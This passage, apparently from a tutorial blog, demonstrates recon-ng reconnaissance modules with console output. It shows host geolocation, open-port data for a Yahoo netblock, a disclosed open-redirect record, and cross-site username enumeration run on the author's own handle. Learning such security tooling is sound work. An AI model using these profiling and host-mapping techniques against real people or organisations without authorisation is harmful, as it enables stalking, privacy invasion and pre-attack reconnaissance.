</span><span class='line'>[*] Category: REDIRECT
</span><span class='line'>[*] Example: https://store.bitdefender.com/redirect.php?url=http://xssposed.org/
</span><span class='line'>[*] Host: store.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2015-09-19 20:33:58
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/87399/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 5 total (5 new) vulnerabilities found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Hosts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames stored in the &lsquo;hosts&rsquo; table</p></li>
<li><p>Bing API IP Neighbor Enumerator &ndash; Leverages the Bing API and &ldquo;ip:&rdquo; advanced search operator to enumerate other virtual hosts sharing
the same IP address. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>FreeGeoIP &ndash; Leverages the freegeoip.net API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
</ul>


<p>I used this to check the location of www.google.com host (resolved the IP first):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][freegeoip] &gt; run
</span><span class='line'>[*] 172.217.16.100 - 37.4192,-122.0574 - Mountain View, California, United States</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>My-IP-Neighbors.com Lookup &ndash; Checks My-IP-Neighbors.com for virtual hosts on the same server. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>IPInfoDB GeoIP &ndash; Leverages the ipinfodb.com API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>Hostname Resolver &ndash; Resolves the IP address for a host. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each IP address to resolve the hostname. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Address Geocoder &ndash; Queries the Google Maps API to obtain coordinates for an address. Updates the &lsquo;locations&rsquo; table with
the results.</p></li>
</ul>


<p>Let&rsquo;s see this module in action with one of our favorite tech giants&#8217; addresses xD (I leave it to you to see what&rsquo;s located there):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][geocode] &gt; run
</span><span class='line'>[*] Geocoding '1600 Amphitheatre Parkway'...
</span><span class='line'>[*] Latitude: 37.4224713, Longitude: -122.0843333
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 1 total (1 new) locations found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Reverse Geocoder &ndash; Queries the Google Maps API to obtain an address from coordinates.</li>
</ul>


<p>So we have some coordinates. Let&rsquo;s see what&rsquo;s there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][reverse_geocode] &gt; run
</span><span class='line'>[*] Reverse geocoding (35.670337, 139.702573)...
</span><span class='line'>[*] 1 Chome-18-20 Jingūmae, Shibuya-ku, Tōkyō-to 150-0001, Japan
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 1 total (1 new) locations found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Flickr Geolocation Search &ndash; Searches Flickr for media in the specified proximity to a location.</p></li>
<li><p>Instagram Geolocation Search &ndash; Searches Instagram for media in the specified proximity to a location.</p></li>
<li><p>Picasa Geolocation Search &ndash; Searches Picasa for media in the specified proximity to a location.</p></li>
<li><p>Shodan Geolocation Search &ndash; Searches Shodan for media in the specified proximity to a location.</p></li>
<li><p>Twitter Geolocation Search &ndash; Searches Twitter for media in the specified proximity to a location.</p></li>
<li><p>YouTube Geolocation Search &ndash; Searches YouTube for media in the specified proximity to a location.</p></li>
<li><p>Whois Company Harvester &ndash; Uses the ARIN Whois RWS to harvest Companies data from whois queries for the given netblock. Updates
the &lsquo;companies&rsquo; table with the results.</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each of a netblock&rsquo;s IP addresses to resolve the hostname. Updates the
&lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Shodan Network Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;net&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Internet Census 2012 Lookup &ndash; Queries the Internet Census 2012 data through Exfiltrated.com to enumerate open ports for a
netblock.</p></li>
</ul>


<p>This will come in handy to give you an idea about hosts without directly port scanning them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][census_2012] &gt; run
</span><span class='line'>
</span><span class='line'>-----------
</span><span class='line'>8.3.34.0/23
</span><span class='line'>-----------
</span><span class='line'>[*] 8.3.34.0/23 (8.3.34.0 - 8.3.35.255)
</span><span class='line'>[*] 8.3.34.5 (rsw4-1-gci.smpenn.corp.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.28 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.46 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.60 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.66 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.79 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.222 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.225 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) - 25
</span><span class='line'>[*] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.246 (tstsqlclstr1d.smca.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.255 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.71 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) - 25
</span><span class='line'>[*] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.186 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.220 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 17 total (17 new) ports found.</span></code></pre></td></tr></table></div></figure>


<p>`</p>

<ul>
<li><p>Ports to Hosts Data Migrator &ndash; Adds a new host for all the hostnames stored in the &lsquo;ports&rsquo; table.</p></li>
<li><p>Dev Diver Repository Activity Examiner &ndash; Searches public code repositories for information about a given username.</p></li>
</ul>


<p>This is another useful module to search for a developer on different platforms (note to self: I have to get back into coding frenzy):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][dev_diver] &gt; run
</span><span class='line'>[*] Checking Github...
</span><span class='line'>[*] Github username found - (https://api.github.com/users/chousensha)
</span><span class='line'>
</span><span class='line'>  +-------------------------------------------------------------------+
</span><span class='line'>  |                               Github                              |
</span><span class='line'>  +-------------------------------------------------------------------+
</span><span class='line'>  | Resource    | Github                                              |
</span><span class='line'>  | User Name   | chousensha                                          |
</span><span class='line'>  | Profile URL | https://github.com/chousensha                       |
</span><span class='line'>  | Avatar URL  | https://avatars.githubusercontent.com/u/5703557?v=3 |
</span><span class='line'>  | Location    |                                                     |
</span><span class='line'>  | Company     |                                                     |
</span><span class='line'>  | Blog URL    | http://chousensha.github.io/                        |
</span><span class='line'>  | Email       |                                                     |
</span><span class='line'>  | Bio         |                                                     |
</span><span class='line'>  | Followers   | 2                                                   |
</span><span class='line'>  | ID          | 5703557                                             |
</span><span class='line'>  | Joined      | 2013-10-16                                          |
</span><span class='line'>  | Updated     | 2016-04-29                                          |
</span><span class='line'>  +-------------------------------------------------------------------+
</span><span class='line'>
</span><span class='line'>[*] Checking Bitbucket...
</span><span class='line'>[*] Bitbucket username not found.
</span><span class='line'>[*] Checking SourceForge...
</span><span class='line'>[*] Sourceforge username not found.
</span><span class='line'>[*] Checking CodePlex...
</span><span class='line'>[*] CodePlex username not found.
</span><span class='line'>[*] Checking Gitorious...
</span><span class='line'>[*] Gitorious username not found.
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 1 total (1 new) contacts found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Linkedin Contact Crawler &ndash; Harvests contact information from linkedin.com by parsing the link(s) given and adding the info to
the &lsquo;contacts&rsquo; table.</p></li>
<li><p>Linkedin Profile Crawler &ndash; Harvests profiles from linkedin.com by visting the given link(s), crawling the &ldquo;Viewers of this
profile also viewed&rdquo;, parsing the pages, and adding new profiles to the &lsquo;profiles&rsquo; table</p></li>
<li><p>NameChk.com Username Validator &ndash; Leverages NameChk.com to validate the existance of usernames on specific web sites and updates the
&lsquo;profiles&rsquo; table with the results.</p></li>
</ul>


<p>Good for recon but also for checking if how unique is your l33t handle:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][namechk] &gt; run
</span><span class='line'>[*] Retrieving site data...
</span><span class='line'>
</span><span class='line'>----------
</span><span class='line'>CHOUSENSHA
</span><span class='line'>----------
</span><span class='line'>[*] Wordpress: Available.
</span><span class='line'>[*] Reddit: Available.
</span><span class='line'>[*] Blogger: Available.
</span><span class='line'>[*] GooglePlus: Available.
</span><span class='line'>[*] Ebay: Available.
</span><span class='line'>[*] Twitch: Available.
</span><span class='line'>[*] Instagram: Available.
</span><span class='line'>[*] Twitter: User exists!
</span><span class='line'>[*] Facebook: User exists!
</span><span class='line'>[*] Slack: Available.
</span><span class='line'>[*] PayPal: Available.
</span><span class='line'>[*] Pinterest: Available.
</span><span class='line'>[*] Vine: User exists!
</span><span class='line'>[*] Github: User exists!
</span><span class='line'>[*] Basecamp: Available.
</span><span class='line'>[*] Flickr: Available.
</span><span class='line'>[*] Pandora: Available.
</span><span class='line'>[*] Spotify: Available.
</span><span class='line'>[*] YouTube: User exists!
</span><span class='line'>[*] MySpace: Available.
</span><span class='line'>[*] Steam: Available.
</span><span class='line'>[*] Flipboard: Available.
</span><span class='line'>[*] OkCupid: Available.
</span><span class='line'>[*] UStream: Available.
</span><span class='line'>[*] Vimeo: Available.
</span><span class='line'>[*] Etsy: User exists!
</span><span class='line'>[*] BitBucket: Available.
</span><span class='line'>[*] SoundCloud: Available.
</span><span class='line'>[*] 500px: Available.
</span><span class='line'>[*] CashMe: Available.
</span><span class='line'>[*] Meetup: Available.
</span><span class='line'>[*] DailyMotion: Available.
</span><span class='line'>[*] About.me: User exists!
</span><span class='line'>[*] ProductHunt: Available.
</span><span class='line'>[*] Disqus: User exists!
</span><span class='line'>[*] Medium: User exists!
</span><span class='line'>[*] Behance: Available.
</span><span class='line'>[*] Imgur: Available.
</span><span class='line'>[*] Bit.ly: User exists!
</span><span class='line'>[*] Fanpop: Available.
</span><span class='line'>[*] Cafe Mom: Available.
</span><span class='line'>[*] Instructables: Available.
</span><span class='line'>[*] Photobucket: Available.
</span><span class='line'>[*] Good Reads: Available.
</span><span class='line'>[*] deviantART: Available.
</span><span class='line'>[*] Tumblr: Available.
</span><span class='line'>[*] Gravatar: Available.
</span><span class='line'>[*] Venmo: User exists!
</span><span class='line'>[*] Keybase: Available.
</span><span class='line'>[*] StumbleUpon: User exists!
</span><span class='line'>[*] Kongregate: User exists!
</span><span class='line'>[*] LiveJournal: Available.
</span><span class='line'>[*] Yelp: User exists!
</span><span class='line'>[*] Codecademy: Available.
</span><span class='line'>[*] Foursquare: Available.
</span><span class='line'>[*] Team Treehouse: Available.
</span><span class='line'>[*] AngelList: Available.
</span><span class='line'>[*] Viddler: Available.
</span><span class='line'>[*] tsu: Available.
</span><span class='line'>[*] last.fm: Available.
</span><span class='line'>[*] Technorati: Available.
</span><span class='line'>[*] Aviary: User exists!
</span><span class='line'>[*] Fotolog: User exists!
</span><span class='line'>[*] Slideshare: Available.
</span><span class='line'>[*] Blinklist: Available.
</span><span class='line'>[*] Tripit: User exists!
</span><span class='line'>[*] GogoBot: Available.
</span><span class='line'>[*] Flavors.me: Available.
</span><span class='line'>[*] BuzzFeed: Available.
</span><span class='line'>[*] TripAdvisor: Available.
</span><span class='line'>[*] blip.fm: Available.
</span><span class='line'>[*] Dribbble: Available.
</span><span class='line'>[*] Geeklist: User exists!
</span><span class='line'>[*] Papaly: Available.
</span><span class='line'>[*] wishlistr: Available.
</span><span class='line'>[*] Vk: Available.
</span><span class='line'>[*] Pastebin: Available.
</span><span class='line'>[*] Coinbase: Available.
</span><span class='line'>[*] iFunny: Available.
</span><span class='line'>[*] Roblox: User exists!
</span><span class='line'>[*] XFire: Available.
</span><span class='line'>[*] Witty: User exists!
</span><span class='line'>[*] Wikipedia: Available.
</span><span class='line'>[*] Hackernews: User exists!
</span><span class='line'>[*] StreamMe: Available.
</span><span class='line'>[*] Abouto: Available.
</span><span class='line'>[*] qmpeople: Available.
</span><span class='line'>[*] Fiverr: Available.
</span><span class='line'>[*] Plenty Of Fish: Available.
</span><span class='line'>[*] Voat: User exists!
</span><span class='line'>[*] Trakt: Available.
</span><span class='line'>[*] IFTTT: Available.
</span><span class='line'>[*] Crokes: User exists!
</span><span class='line'>[*] Tracky: Available.
</span><span class='line'>[*] GetSatisfaction: Available.
</span><span class='line'>[*] Ello: User exists!
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 24 total (24 new) profiles found.</span></code></pre></td></tr></table></div></figure>


<p>Hmm, quite a few other &ldquo;challengers&rdquo;.</p>

<ul>
<li>OSINT HUMINT Profile Collector &ndash; Takes each username from the profiles table and searches a variety of web sites for those users.</li>
</ul>


<p>This one checks 191 sites for the username, here we go:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][profiler] &gt; run
</span><span class='line'>[*] Retrieving https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...
</span><span class='line'>
</span><span class='line'>  Looking Up Data For: Chousensha
</span><span class='line'>  -------------------------------
</span><span class='line'>[*] Checking: about.me
</span><span class='line'>[*] Checking: AdultFriendFinder
</span><span class='line'>[*] Checking: Matchdoctor
</span><span class='line'>[*] Checking: AngelList
</span><span class='line'>[*] Checking: aNobil
</span><span class='line'>[*] Checking: ask.fm
</span><span class='line'>[*] Checking: Atlassian
</span><span class='line'>[*] Checking: Atlassian Self-Signup
</span><span class='line'>[*] Checking: AudioBoom
</span><span class='line'>[*] Checking: authorSTREAM
</span><span class='line'>[*] Checking: badoo
</span><span class='line'>[*] Checking: Bitbucket
</span><span class='line'>[*] Checking: BLIP.fm
</span><span class='line'>[*] Checking: Black Planet
</span><span class='line'>[*] Checking: Blogmarks
</span><span class='line'>[*] Checking: Blogspot
</span><span class='line'>[*] Checking: BodyBuilding.com
</span><span class='line'>[*] Checking: Break
</span><span class='line'>[*] Checking: Bugcrowd
</span><span class='line'>[*] Checking: cafemom
</span><span class='line'>[*] Checking: CarDomain
</span><span class='line'>[*] Checking: cHEEZburger
</span><span class='line'>[*] Checking: CodePlex
</span><span class='line'>[*] Checking: CoderStats
</span><span class='line'>[*] Checking: COLOURlovers
</span><span class='line'>[*] Checking: Conferize
</span><span class='line'>[*] Checking: copytaste
</span><span class='line'>[*] Checking: cruiseMates
</span><span class='line'>[*] Checking: Dailymotion
</span><span class='line'>[*] Checking: Delicious
</span><span class='line'>[*] Checking: DeviantArt
</span><span class='line'>[*] Checking: diigo
</span><span class='line'>[*] Checking: DIY
</span><span class='line'>[*] Checking: eBay
</span><span class='line'>[*] Checking: EightBit
</span><span class='line'>[*] [profile] chousensha - CoderStats (http://coderstats.net/github/chousensha/)
</span><span class='line'>[*] Checking: Engadget
</span><span class='line'>[*] Checking: EPORNER
</span><span class='line'>[*] Checking: Etsy
</span><span class='line'>[*] Checking: facebook.com
</span><span class='line'>[*] Checking: families.com
</span><span class='line'>[*] Checking: fanpop
</span><span class='line'>[*] Checking: FFFFOUND!
</span><span class='line'>[*] Checking: Fiverr
</span><span class='line'>[*] Checking: Flickr
</span><span class='line'>[*] Checking: Foodspotting
</span><span class='line'>[*] Checking: Fotolog
</span><span class='line'>[*] Checking: Foursquare
</span><span class='line'>[*] Checking: freesound
</span><span class='line'>[*] Checking: FriendFinder-X
</span><span class='line'>[*] Checking: FunnyOrDie
</span><span class='line'>[*] Checking: Garmin connect
</span><span class='line'>[*] Checking: GeekGrade
</span><span class='line'>[*] Checking: Geocaching
</span><span class='line'>[*] Checking: GETItON
</span><span class='line'>[*] Checking: GitHub
</span><span class='line'>[*] Checking: gogobot
</span><span class='line'>[*] Checking: goodreads
</span><span class='line'>[*] Checking: Gravatar
</span><span class='line'>[*] Checking: howaboutwe
</span><span class='line'>[*] Checking: HubPages
</span><span class='line'>[*] Checking: I-am-pregnant
</span><span class='line'>[*] Checking: IFTTT
</span><span class='line'>[*] [profile] chousensha - GitHub (https://api.github.com/users/chousensha)
</span><span class='line'>[*] Checking: ImageShack
</span><span class='line'>[*] Checking: imgur
</span><span class='line'>[*] Checking: InsaneJournal
</span><span class='line'>[*] Checking: Instagram
</span><span class='line'>[*] Checking: instructables
</span><span class='line'>[*] Checking: Internet Archive
</span><span class='line'>[*] Checking: interpals
</span><span class='line'>[*] Checking: Keybase
</span><span class='line'>[*] Checking: Klear
</span><span class='line'>[*] Checking: Klout
</span><span class='line'>[*] Checking: Kongregate
</span><span class='line'>[*] Checking: Lanyrd
</span><span class='line'>[*] Checking: Last.fm
</span><span class='line'>[*] Checking: LibraryThing
</span><span class='line'>[*] Checking: LinkedIn
</span><span class='line'>[*] Checking: LiveJasmin
</span><span class='line'>[*] Checking: Marketing Land
</span><span class='line'>[*] Checking: mate1
</span><span class='line'>[*] [profile] chousensha - Kongregate (http://www.kongregate.com/accounts/chousensha)
</span><span class='line'>[*] Checking: Medium
</span><span class='line'>[*] Checking: Meetzur
</span><span class='line'>[*] Checking: Microsoft Technet Community
</span><span class='line'>[*] Checking: Mixcloud
</span><span class='line'>[*] Checking: Mixcrate
</span><span class='line'>[*] Checking: Mixlr
</span><span class='line'>[*] Checking: Mod DB
</span><span class='line'>[*] Checking: Muck Rack
</span><span class='line'>[*] [profile] chousensha - Internet Archive (http://archive.org/search.php?query=chousensha)
</span><span class='line'>[*] Checking: MyBuilder.com
</span><span class='line'>[*] Checking: MyFitnessPal
</span><span class='line'>[*] Checking: MyLot
</span><span class='line'>[*] Checking: Myspace
</span><span class='line'>[*] Checking: netvibes
</span><span class='line'>[*] Checking: Newsvine
</span><span class='line'>[*] Checking: Overcast Network
